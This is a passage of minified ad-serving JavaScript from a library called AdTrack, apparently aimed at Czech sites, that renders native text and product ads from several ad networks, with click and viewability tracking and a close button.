        var u = "scale(" + a + ")";
        AdTrack.Utils.applyTransform(this.banner, u, "left top");
        var p = this.definitionObj.getOption("closerSizeCoeff") || 1;
        if (this.googleCloser) {
          var f = this.definitionObj.getOption("googleCloserCoeff") || 1.4;
          f && (p = f);
        }
        var g = "scale(" + p + ")";
        AdTrack.Utils.applyTransform(this.closer.getWrap(), g);
      }
    },
    loaded: function (t) {
      var e = t.data.style ? t.data.style.options.width : null,
        i = t.data.style ? t.data.style.options.height : null,
        r = e || t.data.width || this.definition.options.width,
        n = i || t.data.height || this.definition.options.height;
      t.data && t.data.chd && (this.textAd = t.data.chd.textAd, this.googleCloser = -1 !== t.data.chd.tag.indexOf("google") || "adsense" === t.data.chd.tag), this.mediaShadow = this.definitionObj.getOption("mediaShadow", t.data.style);
      var s = this.definitionObj.getOption("mediaSelector");
      if (s ? (this.media = this.window.document.querySelector(s), this.media || (this.errorReporting.doError("Media not found"), this.media = this.mainWrap)) : (this.errorReporting.doError("Media selector not provided"), this.media = this.mainWrap), this.isLoaded = !0, r && n) {
        this.width = r, this.height = n;
        var a = 0,
          o = function () {
            a++, this.mediaWidth = this.media.clientWidth, this.mediaHeight = this.media.clientHeight, this.mediaWidth && this.mediaHeight ? (this.addSideComponents(t), this.setUp(), this.styles.addCss(AdTrack.Styles.DEFAULT, this.defaultCss), this.open()) : 5 === a ? this.errorReporting.doError("Unable to get media size") : setTimeout(o, 2e3);
          }.bind(this);
        o();
      } else this.errorReporting.doError("Undefined width or height");
    },
    destroy: function () {},
    show: function () {
      this.wrap && (this.wrap.style.display = "block");
    },
    hide: function () {
      this.wrap && (this.wrap.style.display = "none");
    },
    changeCloserListener(t) {
      this.closer && (this.closerClickListener && AdTrack.Utils.removeEvent(this.closer.getElement(), "click", this.closerClickListener), this.closerClickListener = t, AdTrack.Utils.addEvent(this.closer.getElement(), "click", this.closerClickListener));
    },
    open: function () {
      this.timeShow = AdTrack.Utils.timeRelative(), this.show(), this.changeCloserListener(function (t) {
        return this.close(), t.preventDefault(), !1;
      }.bind(this)), this.events.trigger("show");
    },
    close: function () {
      if (this.mediaShadow && (this.media.style.filter = "none"), !this.hasClosed) {
        this.hasClosed = !0;
        var t = AdTrack.Utils.timeRelative() - this.timeShow;
        this.events.trigger("close", [t]);
      }
      this.hide(), this.events.trigger("hide");
    }
  };
}, function (t, e) {
  AdTrack.GenericAd = function (t, e) {
    this.adSet = t, this.ad = e;
  }, AdTrack.GenericAd.prototype = {
    getData: function () {
      return this.ad;
    },
    getHeadline: function () {
      return this.ad.getText().getTitle();
    },
    getDescription: function () {
      return this.ad.getText().getDescription();
    },
    getAdChoices: function () {
      return this.adSet.getAdChoices().getPromoText();
    },
    adChoicesOptional: function () {
      return this.adSet.getAdChoices().isOptional();
    }
  }, AdTrack.GenericProductAd = function (t, e) {
    this.adSet = t, this.ad = e;
  }, AdTrack.GenericProductAd.prototype = {
    getData: function () {
      return this.ad;
    },
    getHeadline: function () {
      return this.ad.getProductName();
    },
    getDescription: function () {
      return this.adSet.getShop().getShopName() + " - " + this.ad.getProductPrice();
    },
    getAdChoices: function () {
      return this.adSet.getAdChoices().getPromoText();
    },
    adChoicesOptional: function () {
      return this.adSet.getAdChoices().isOptional();
    }
  }, AdTrack.AdformAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.AdformAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.AdformAd.prototype.constructor = AdTrack.AdformAd, AdTrack.SklikAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.SklikAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.SklikAd.prototype.constructor = AdTrack.SklikAd, AdTrack.EtargetAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.EtargetAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.EtargetAd.prototype.constructor = AdTrack.EtargetAd, AdTrack.CriteoProductAd = function (t, e) {
    AdTrack.GenericProductAd.call(this, t, e);
  }, AdTrack.CriteoProductAd.prototype = Object.create(AdTrack.GenericProductAd.prototype), AdTrack.CriteoProductAd.prototype.constructor = AdTrack.CriteoProductAd, AdTrack.CriteoProductAd.prototype.getDescription = function () {
    var t = this.ad.getProductDescription(),
      e = this.ad.getProductPrice(),
      i = e && -1 === t.indexOf(e);
    return this.adSet.getShop().getShopName() + " - " + (i ? e + " - " : "") + t;
  }, AdTrack.CriteoProductAd.prototype.getAdChoices = function () {
    return "<img src='' class='AdTrack-promoIcon' style='width: 11px; height: auto;'/>";
  }, AdTrack.SklikProductAd = function (t, e) {
    AdTrack.GenericProductAd.call(this, t, e);
  }, AdTrack.SklikProductAd.prototype = Object.create(AdTrack.GenericProductAd.prototype), AdTrack.SklikProductAd.prototype.constructor = AdTrack.SklikProductAd, AdTrack.SmartAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.SmartAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.SmartAd.prototype.constructor = AdTrack.SmartAd, AdTrack.SmartAd.prototype.getAdChoices = function () {
    return this.adChoicesOptional() ? this.adSet.getAdChoices().getPromoText() : "<img src='' class='AdTrack-promoIcon' style='width: 11px; height: auto;'/>";
  }, AdTrack.MgidAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.MgidAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.MgidAd.prototype.constructor = AdTrack.MgidAd, AdTrack.PubmaticAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.PubmaticAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.PubmaticAd.prototype.constructor = AdTrack.PubmaticAd, AdTrack.RubiconAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.RubiconAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.RubiconAd.prototype.constructor = AdTrack.RubiconAd, AdTrack.RTBHouseAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.RTBHouseAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.RTBHouseAd.prototype.constructor = AdTrack.RTBHouseAd, AdTrack.WPartnerAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.WPartnerAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.WPartnerAd.prototype.constructor = AdTrack.WPartnerAd, AdTrack.AppnexusAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.AppnexusAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.AppnexusAd.prototype.constructor = AdTrack.AppnexusAd, AdTrack.AdagioAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.AdagioAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.AdagioAd.prototype.constructor = AdTrack.AdagioAd, AdTrack.StrossleAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.StrossleAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.StrossleAd.prototype.constructor = AdTrack.StrossleAd, AdTrack.EngerioAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.EngerioAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.EngerioAd.prototype.constructor = AdTrack.EngerioAd, AdTrack.TaboolaAd = function (t, e) {
    AdTrack.GenericAd.call(this, t, e);
  }, AdTrack.TaboolaAd.prototype = Object.create(AdTrack.GenericAd.prototype), AdTrack.TaboolaAd.prototype.constructor = AdTrack.TaboolaAd;
}, function (t, e) {
  AdTrack.TextChannel = function (t, e, i, r, n) {
    this.window = t, this.definitionObj = e, this.definition = e.definition, this.chd = i, this.transforms = r, this.errorReporting = n;
  }, AdTrack.TextChannel.prototype = {
    renderAds: function (t, e, i) {
      this.container = t, this.format = i, this.chd.textAd = !0, this.chd.adSet = e;
      var r = e.getStyle();
      this.adCount = Math.min(r.count, e.getAdsCount()), this.validator = new AdTrack.Validator();
      var n = this.definition.options.nativeOptions ? this.definition.options.nativeOptions : null;
      if ((n = r.options.nativeOptions ? r.options.nativeOptions : n) && (this.validator.setTextMaxLength(n.maxTextLength), this.validator.setTitleMaxLength(n.maxTitleLength), this.validator.setDescriptionMaxLength(n.maxDescLength)), r && r.options && r.options.wrap && r.options.ad) {
        var s,
          a = document.createElement("div");
        for (a.innerHTML = r.options.wrap, Array.from(a.children).forEach(function (e) {
          t.appendChild(e), this.transforms && this.transforms.customTransform(function () {
            e.parentNode.removeChild(e);
          });
        }.bind(this)), s = 0; s < e.getWrapPartsCount(); s++) {
          var o = e.getWrapPart(s);
          o && this.renderWrapPart(t, o, r);
        }
        var d = AdTrack.Utils.getNS(t, this.definition.cls.ads);
        for (s = 0; s < Math.min(r.count, e.getAdsCount()); s++) {
          var c = e.getAd(s);
          if (c) {
            var h = this.definition.cls.ad.replace("*", s),
              l = AdTrack.Utils.getNS(t, h);
            if (d.length > 0) {
              var u = this.window.document.createElement("div");
              d[0].appendChild(u), this.renderAd(u, c, s, r);
            }
            l.length > 0 && (this.renderAd(l[0], c, s, r), AdTrack.Utils.clearClass(l, h));
          }
        }
        AdTrack.Utils.clearClass(d, this.definition.cls.ads), "fuzzyAfter" == this.definition.options.dom.method && this.definition.options.dom.fuzzyStyleize && AdTrack.Utils.styleizeAll(this.window.document, t, this.transforms), this.renderGenericAdChoices(t, c), this.renderShop(t, e.getShop(), r), this.renderPromo(t, e.getAdChoices()), this.renderCloser(t), this.renderSlider(t), this.renderDate(t);
      } else this.errorReporting.doError("Invalid template for text ad " + this.definitionObj.getId().getNameForReporting());
    },
    adClick: function (t, e, i, r, n, s) {
      s = s || [];
      var a, o, d;
      AdTrack.Utils.setOnclick(t, (a = e, o = i, d = r, function (t) {
        var e = AdTrack.Utils.getEventRelativePos(t, this.container);
        t = t || this.window.event, this.format.clicked(e.x, e.y, a, o), s.forEach(function (t) {
          new Image().src = t;
        }), this.definition.options.newwindow || (t.preventDefault ? t.preventDefault() : t.returnValue = !1, !1 === AdTrack.Utils.redirect(d) && this.errorReporting.doError("Cant redirect (text)"));
      }).bind(this), this.definition.options.newwindow), this.definition.options.hideHref ? AdTrack.Utils.setAttribute(t, "href", "") : AdTrack.Utils.setAttribute(t, "href", r);
      try {
        this.window != window.top && AdTrack.Utils.setAttribute(t, "target", "_top");
      } catch (e) {
        AdTrack.Utils.setAttribute(t, "target", "_top");
      }
      this.definition.options.newwindow && AdTrack.Utils.setAttribute(t, "target", "_blank");
    },
    renderAd: function (t, e, i, r) {
      var n = e.getData(),
        s = null;
      s = "string" == typeof r.options.ad ? r.options.ad : r.options.ad[i] || r.options.ad[r.options.ad.length - 1];
      var a = this.window.document.createElement("div");
      for (a.innerHTML = s; a.firstChild;) t.appendChild(a.firstChild);
      var o = new AdTrack.Evaluator(),
        d = this.definition.options.nativeOptions ? this.definition.options.nativeOptions : null;
      (d = r.options.nativeOptions ? r.options.nativeOptions : d) && (o.setImgWidth(d.imgWidth), o.setImageHeight(d.imgHeight), o.setTextLength(d.textLength), o.setTitleLength(d.titleLength), o.setDescriptionLength(d.descLength)), n.setEvaluator(o), this.renderGenericAdPart(t, e), this.renderAdPart(t, n, i, r), this.setUpZoomInFeature(t);
    },
    renderShop: function (t, e, i) {
      AdTrack.Shop.prototype.isPrototypeOf(e) && (this.renderShopName(e.getShopName(), t), this.renderShopSlogan(e.getShopSlogan(), t), this.renderShopUrl(e.getShopUrl(), t, i), this.renderCleanShopUrl(e.getCleanShopUrl(), t), this.renderShopLogo(e.getShopLogo(), t), this.renderLogoutUrl(e.getLogoutUrl(), t));
    },
    renderWrapPart: function (t, e, i) {
      this.errorReporting.doError("Unsupported wrap part.");
    },
    renderGenericAdPart: function (t, e) {
      var i = e.getHeadline(),
        r = e.getDescription(),
        n = new AdTrack.TextObj(i, r);
      this.validator.validateTextLengths(n);
      var s = n.getTitle(),
        a = n.getDescription();
      this.renderValidatedText(t, s, n.getOriginalTitle(), this.definition.cls.headline), this.renderValidatedText(t, a, n.getOriginalDescription(), this.definition.cls.description);
    },
    renderGenericAdChoices: function (t, e) {
      var i = AdTrack.Utils.getNS(t, this.definition.cls.adChoices);
      Array.prototype.forEach.call(i, function (t) {
        "true" === t.getAttribute("data-not-required") && e.adChoicesOptional() && t.setAttribute("style", "display: none !important;");
      }.bind(this)), AdTrack.Utils.clearClass(AdTrack.Utils.setText(i, e.getAdChoices()), this.definition.cls.adChoices), this.definition.options.hideAdChoices && e.adChoicesOptional() && AdTrack.Utils.setAttribute(i, "style", "display: none;");
    },
    renderAdPart: function (t, e, i, r) {
      if (AdTrack.TextAd.prototype.isPrototypeOf(e)) {
        this.renderAdScreenshots(e, t, r), this.renderText(e.getText(), t), this.renderClickUrl(e.getClickUrl(), t, i, r, e.getClickTrackers()), this.renderVisibleUrl(e.getVisibleUrl(), t), this.renderAdUrl(e.getAdUrl(), t), this.renderCta(e.getCta() || this.definitionObj.getDefaultCTA(), t), this.renderFavicon(e.getFavicon(), t);
        var n = "sklik" == this.chd.tag || "sklik-hb" == this.chd.tag || "seznam-ssp" == this.chd.tag || "seznam-ssp-hb" == this.chd.tag,
          s = "mgid-hb-native" == this.chd.tag,
          a = "xandr-native" == this.chd.tag,
          o = "strossle" == this.chd.tag;
        (n || s || a || o) && this.renderCompanyName(e.getCompanyName(), t), n && (this.renderLongHeadline(e.getLongHeadline(), t), this.renderLogo(e.getLogoUrl(), t), this.renderSquareLogo(e.getSquareLogoUrl(), t));
        var d = e.getViewabilityTrackers(),
          c = AdTrack.Viewability.Handler(.5);
        c.addCallback(function () {
          d.forEach(function (t) {
            AdTrack.Utils.firePixel(t);
          });
        }, 1), AdTrack.Viewability.Probe(this.window, function () {
          return AdTrack.Viewability.getVisiblePercentage(t);
        }, AdTrack.Viewability.getBasicCallback(c));
      } else AdTrack.ProductAd.prototype.isPrototypeOf(e) ? (this.renderAdScreenshots(e, t, r), this.renderClickUrl(e.getClickUrl(), t, i, r), this.renderProductTemplate(e.getProductName(), e.getProductPrice(), t), this.renderProductName(e.getProductName(), t), this.renderProductDescription(e.getProductDescription(), t), this.renderProductPrice(e.getProductPrice(), t), this.renderProductLastPrice(e.getProductLastPrice(), t), this.renderProductDiscount(e.getProductDiscount(), t), this.renderProductCondition(e.getProductCondition(), t), this.renderAdditionalInfo(e.getAdditionalInfo(), t), this.renderProductManufacturer(e.getProductManufacturer(), t), this.renderProductCategory(e.getProductCategory(), t), this.renderFavicon(e.getFavicon(), t)) : this.errorReporting.doError("Unsupported ad part.");
    },
    setUpZoomInFeature: function (t) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setZoomin(AdTrack.Utils.getNS(t, "AdTrack-zoomin-opacity"), "opacity"), "AdTrack-zoomin-opacity"), AdTrack.Utils.clearClass(AdTrack.Utils.setZoomin(AdTrack.Utils.getNS(t, "AdTrack-zoomin-scale"), "scale"), "AdTrack-zoomin-scale");
    },
    renderValidatedText: function (t, e, i, r) {
      var n = AdTrack.Utils.getNS(t, r);
      AdTrack.Utils.setText(n, e.replace("...", "&#8230;")), e.length < i.length && AdTrack.Utils.setAttribute(n, "title", i.replace("&nbsp;", " ")), AdTrack.Utils.clearClass(n, r);
    },
    renderLongHeadline: function (t, e) {
      if (t) {
        this.validator.validateTextLengths(t);
        var i = t.getTitle();
        this.renderValidatedText(e, i, t.getOriginalTitle(), this.definition.cls.longHeadline);
      }
    },
    renderText: function (t, e) {
      if (t) {
        this.validator.validateTextLengths(t);
        var i = t.getTitle(),
          r = t.getDescription(),
          n = t.getWhole();
        this.renderValidatedText(e, i, t.getOriginalTitle(), this.definition.cls.creative1), this.renderValidatedText(e, r, t.getOriginalDescription(), this.definition.cls.creative23), this.renderValidatedText(e, n, t.getWholeOriginal(), this.definition.cls.creative123);
      } else this.errorReporting.doError("No text provided for " + this.chd.tag + " / " + this.definitionObj.getId().getNameForReporting());
    },
    renderAdScreenshots: function (t, e, i) {
      if (t && "function" == typeof t.getScreenshot) for (var r = [this.definition.cls.screenshothq, this.definition.cls.imageUrl, this.definition.cls.screenshot], n = 0; n < r.length; n++) {
        var s = AdTrack.Utils.getNS(e, r[n]);
        if (s.length > 0) {
          t.getScreenshot(r[n] != this.definition.cls.screenshot, function (t, e) {
            var i = Array.prototype.slice.call(arguments, 2);
            return function () {
              return t.apply(e, i.concat(Array.prototype.slice.call(arguments)));
            };
          }(function (t, e, r) {
            r ? (Array.prototype.forEach.call(t, function (t) {
              var e = i && i.options && i.options.backgroundImage,
                n = t.getAttribute("data-background-image");
              e || n ? t.style.backgroundImage = "url('" + r.url + "')" : (t.setAttribute("src", r.url), r.onError && (s = t.setAttribute("onerror", r.onError)));
            }.bind(this)), AdTrack.Utils.clearClass(t, e)) : this.errorReporting.doError("Screenshot not provided for cls " + e + ", " + this.definitionObj.getId().getNameForReporting());
          }, this, s, r[n]));
        }
      } else this.errorReporting.doError("Screenshots cant be retrieved " + this.definitionObj.getId().getNameForReporting());
    },
    renderCta: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.cta), t), this.definition.cls.cta);
    },
    renderFavicon: function (t, e) {
      var i = AdTrack.Utils.getNS(e, this.definition.cls.favicon);
      this.definition.options.faviconFallback && (i = AdTrack.Utils.setAttribute(i, "onerror", "this.src='" + this.definition.options.faviconFallback + "'")), AdTrack.Utils.clearClass(AdTrack.Utils.setAttribute(i, "src", t), this.definition.cls.favicon);
    },
    renderClickUrl: function (t, e, i, r, n) {
      var s = {
        a: "image",
        b: "title",
        c: "text",
        d: "banner",
        e: "ad",
        f: "url",
        g: "cta"
      };
      for (var a in s) {
        var o = s[a],
          d = this.definition.cls.clickUrl.replace("*", o),
          c = AdTrack.Utils.getNS(e, d);
        this.adClick(c, i, o, t, r, n), AdTrack.Utils.clearClass(c, d);
      }
      var h = -1 !== this.chd.tag.indexOf("seznam"),
        l = !!this.definitionObj.getOption("seznamVignetteOffsetTest", r);
      if ("vignette" === this.definition.renderer && this.adCount && (!h || l || this.definitionObj.getOption("vignetteTest", r))) {
        var u = this.window.document,
          p = this.definition.macros && this.definition.macros.vignetteBannerBackground,
          f = p ? u.querySelector(p) : null;
        if (f) {
          var g = 100 / this.adCount,
            m = this.definition.cls.clickUrl.replace("*", "vignette-" + i),
            k = document.createElement("a");
          k.href = "", k.setAttribute("class", m), k.setAttribute("style", "display: block; width: 100%;height: " + g + "%; margin: 0; padding: 0; box-sizing: border-box;"), f.appendChild(k);
          var b = AdTrack.Utils.getNS(f, m);
          this.adClick(b, i, "vignette", t, r, n), AdTrack.Utils.clearClass(b, m);
        }
      }
    },
    renderVisibleUrl: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.visibleUrl), t), this.definition.cls.visibleUrl);
    },
    renderAdUrl: function (t, e) {
      t = this.definition.options.hideHref ? "#" : t, AdTrack.Utils.clearClass(AdTrack.Utils.setAttribute(AdTrack.Utils.getNS(e, this.definition.cls.adUrl), "href", t), this.definition.cls.adUrl);
    },
    renderProductTemplate: function (t, e, i) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(i, this.definition.cls.productTextTemplate), t + " - Koupit za " + e), this.definition.cls.productTextTemplate);
    },
    renderProductName: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.title), t), this.definition.cls.title);
    },
    renderProductDescription: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.productDescription), t), this.definition.cls.productDescription);
    },
    renderProductPrice: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.price), t), this.definition.cls.price);
    },
    renderProductLastPrice: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.lastPrice), t), this.definition.cls.lastPrice);
    },
    renderProductDiscount: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.discount), t), this.definition.cls.discount);
    },
    renderProductCondition: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.condition), t), this.definition.cls.condition);
    },
    renderAdditionalInfo: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.additionalInfo), t), this.definition.cls.additionalInfo);
    },
    renderProductManufacturer: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.manufacturer), t), this.definition.cls.manufacturer);
    },
    renderProductCategory: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.category), t), this.definition.cls.category);
    },
    renderShopName: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.shopName), t), this.definition.cls.shopName);
    },
    renderShopSlogan: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.shopSlogan), t), this.definition.cls.shopSlogan);
    },
    renderCleanShopUrl: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.cleanShopUrl), t), this.definition.cls.cleanShopUrl);
    },
    renderShopLogo: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setAttribute(AdTrack.Utils.getNS(e, this.definition.cls.shopLogoUrl), "src", t), this.definition.cls.shopLogoUrl);
    },
    renderLogoutUrl: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setAttribute(AdTrack.Utils.getNS(e, this.definition.cls.logoutUrl), "href", t), this.definition.cls.logoutUrl);
    },
    renderLogo: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setAttribute(AdTrack.Utils.getNS(e, this.definition.cls.logoUrl), "src", t), this.definition.cls.logoUrl);
    },
    renderSquareLogo: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setAttribute(AdTrack.Utils.getNS(e, this.definition.cls.squareLogoUrl), "src", t), this.definition.cls.squareLogoUrl);
    },
    renderCompanyName: function (t, e) {
      AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(e, this.definition.cls.companyName), t), this.definition.cls.companyName);
    },
    renderShopUrl: function (t, e, i) {
      var r = AdTrack.Utils.getNS(e, this.definition.cls.shopUrl);
      this.adClick(r, 0, "cta", t, i), AdTrack.Utils.clearClass(r, this.definition.cls.shopUrl);
    },
    renderPromo: function (t, e) {
      if (e) {
        var i = AdTrack.Utils.getNS(t, this.definition.cls.promoIcon);
        AdTrack.Utils.setAttribute(i, "src", e.getPromoIcon()), AdTrack.Utils.setAttribute(i, "title", "Reklama"), AdTrack.Utils.clearClass(i, this.definition.cls.promoIcon), AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(t, this.definition.cls.promoTitle), e.getPromoText()), this.definition.cls.promoTitle), AdTrack.Utils.clearClass(AdTrack.Utils.setAttribute(AdTrack.Utils.setAttribute(AdTrack.Utils.getNS(t, this.definition.cls.promoClick), "href", e.getPromoClickUrl()), "target", "_top"), this.definition.cls.promoClick);
      } else this.errorReporting.doError("Ad choices not provided" + this.definitionObj.getId().getNameForReporting());
    },
    renderCloser: function (t) {
      this.closeHandle = function (t) {
        this.format && ((t = t || this.window.event).preventDefault ? t.preventDefault() : t.returnValue = !1, this.format.close());
      }.bind(this), AdTrack.Utils.clearClass(AdTrack.Utils.setText(AdTrack.Utils.getNS(t, this.definition.cls.closeTitle), "Zavřít reklamu"), this.definition.cls.closeTitle), AdTrack.Utils.clearClass(AdTrack.Utils.setOnclick(AdTrack.Utils.getNS(t, this.definition.cls.closeClick), this.closeHandle), this.definition.cls.closeClick);
    },
    renderSlider: function (t) {
      AdTrack.Utils.getNS(t, "AdTrack-slider-wrapper").length > 0 && AdTrack.Slider.create(t);
    },
    renderDate: function (t) {
      var e,
        i,
        r,
        n,
        s,
        a,
        o,
        d,
        c = (r = new Date(), s = function (t) {
          var e = r.getMonth() + 1;
          return t && e < 10 ? "0" + e : "" + e;
        }, a = function (t) {
          var e = r.getFullYear().toString();
          return t ? e.substring(2, 4) : e;
        }, o = function (t, e) {
          var i = r.getHours();
          return e && (i = 0 === i || 12 === i ? 12 : i % 12), t && i < 10 ? "0" + i : "" + i;
        }, d = {
          d: (n = function (t) {
            var e = r.getDate();
            return t && e < 10 ? "0" + e : "" + e;
          })(!0),
          j: n(),
          m: s(!0),
          n: s(),
          Y: a(),
          y: a(!0),
          g: o(!1, !0),
          G: o(!1, !1),
          h: o(!0, !0),
          H: o(!0, !1),
          i: (i = r.getMinutes(), i < 10 ? "0" + i : "" + i),
          s: (e = r.getSeconds(), e < 10 ? "0" + e : "" + e)
        }, {
          getDateFormatted: function (t) {
            var e = "";
            if (t && "string" == typeof t) for (var i = 0; i < t.length; i++) {
              var r = t[i];
              e += d[r] ? d[r] : r;
            }
            return e;
          }
        }),
        h = AdTrack.Utils.getNS(t, this.definition.cls.date);
      Array.prototype.forEach.call(h, function (t) {
        t.innerHTML = c.getDateFormatted(t.innerHTML);
      }.bind(this)), AdTrack.Utils.clearClass(h, this.definition.cls.date);
    }
  };
}, function (t, e) {
  AdTrack.TextAd = function () {
    this.texts = [], this.screenshots = new AdTrack.ImageCollection(), this.adUrl = "", this.clickUrl = "", this.visibleUrl = "", this.clickTrackers = [], this.viewabilityTrackers = [], this.longHeadline = "", this.companyName = "", this.logoUrl = "", this.squareLogoUrl = "", this.cta = "", this.favicon = "", this.evaluator = null;
  }, AdTrack.TextAd.prototype = {
    done: function () {
      this.screenshots.close();
    },
    setEvaluator: function (t) {
      this.evaluator = t;
    },
    addText: function (t, e) {
      var i = new AdTrack.TextObj(t, e);
      this.texts.push(i);
    },
    getText: function () {
      return this.evaluator && "function" == typeof this.evaluator.pickBestText ? this.evaluator.pickBestText(this.texts) : this.texts[0];
    },
    addScreenshot: function (t, e, i, r) {
      t && this.screenshots.addScreenshot(t, e, i, r);
    },
    getScreenshot: function (t, e) {
      "function" == typeof e && this.screenshots.then(function (i) {
        this.evaluator && "function" == typeof this.evaluator.pickBestScreenshot ? e(this.evaluator.pickBestScreenshot(i, t)) : e(i[0]);
      }.bind(this));
    },
    setAdUrl: function (t) {
      this.adUrl = t;
    },
    getAdUrl: function () {
      return this.adUrl;
    },
    setClickUrl: function (t) {
      this.clickUrl = t;
    },
    getClickUrl: function () {
      return this.clickUrl;
    },
    setVisibleUrl: function (t) {
      t && (this.visibleUrl = t);
    },
    getVisibleUrl: function () {
      return this.visibleUrl;
    },
    setCta: function (t) {
      t && (this.cta = t);
    },
    getCta: function () {
      return this.cta;
    },
    setFavicon: function (t) {
      t && (this.favicon = t);
    },
    getFavicon: function () {
      return this.favicon;
    },
    setLongHeadline: function (t) {
      t && (this.longHeadline = new AdTrack.TextObj(t, ""));
    },
    getLongHeadline: function () {
      return this.longHeadline;
    },
    setCompanyName: function (t) {
      t && (this.companyName = t);
    },
    getCompanyName: function () {
      return this.companyName;
    },
    setLogoUrl: function (t) {
      t && (this.logoUrl = t);
    },
    getLogoUrl: function () {
      return this.logoUrl;
    },
    setSquareLogoUrl: function (t) {
      t && (this.squareLogoUrl = t);
    },
    getSquareLogoUrl: function () {
      return this.squareLogoUrl;
    },
    setClickTrackers: function (t) {
      t && "function" == typeof t.forEach && (this.clickTrackers = t);
    },
    getClickTrackers: function () {
      return this.clickTrackers;
    },
    setViewabilityTrackers: function (t) {
      t && "function" == typeof t.forEach && (this.viewabilityTrackers = t);
    },
    getViewabilityTrackers: function () {
      return this.viewabilityTrackers;
    }
  }, AdTrack.ProductAd = function () {
    this.screenshots = new AdTrack.ImageCollection(), this.name = "", this.description = "", this.price = "", this.lastPrice = "", this.discount = "", this.condition = "", this.manufacturer = "", this.category = "", this.additionalInfo = "", this.clickUrl = "", this.favicon = "", this.evaluator = null;
  }, AdTrack.ProductAd.prototype = {
    done: function () {
      this.screenshots.close();
    },
    setEvaluator: function (t) {
      this.evaluator = t;
    },
    addScreenshot: function (t, e, i, r) {
      t && this.screenshots.addScreenshot(t, e, i, r);
    },
    getScreenshot: function (t, e) {
      "function" == typeof e && this.screenshots.then(function (i) {
        this.evaluator && "function" == typeof this.evaluator.pickBestScreenshot ? e(this.evaluator.pickBestScreenshot(i, t)) : e(i[0]);
      }.bind(this));
    },
    setProductName: function (t) {
      t && (this.name = t);
    },
    getProductName: function () {
      return this.name;
    },
    setProductPrice: function (t) {
      t && (this.price = t);
    },
    getProductPrice: function () {
      return this.price;
    },
    setProductLastPrice: function (t) {
      t && (this.lastPrice = t);
    },
    getProductLastPrice: function () {
      return this.lastPrice;
    },
    setProductDiscount: function (t) {
      t && (this.discount = t);
    },
    getProductDiscount: function () {
      return this.discount;
    },
    setProductCondition: function (t) {
      t && (this.condition = t);
    },
    getProductCondition: function () {
      return this.condition;
    },
    setAdditionalInfo: function (t) {
      t && (this.additionalInfo = t);
    },
    getAdditionalInfo: function () {
      return this.additionalInfo;
    },
    setProductManufacturer: function (t) {
      t && (this.manufacturer = t);
    },
    getProductManufacturer: function () {
      return this.manufacturer;
    },
    setProductCategory: function (t) {
      t && (this.category = t);
    },
    getProductCategory: function () {
      return this.category;
    },
    setClickUrl: function (t) {
      this.clickUrl = t;
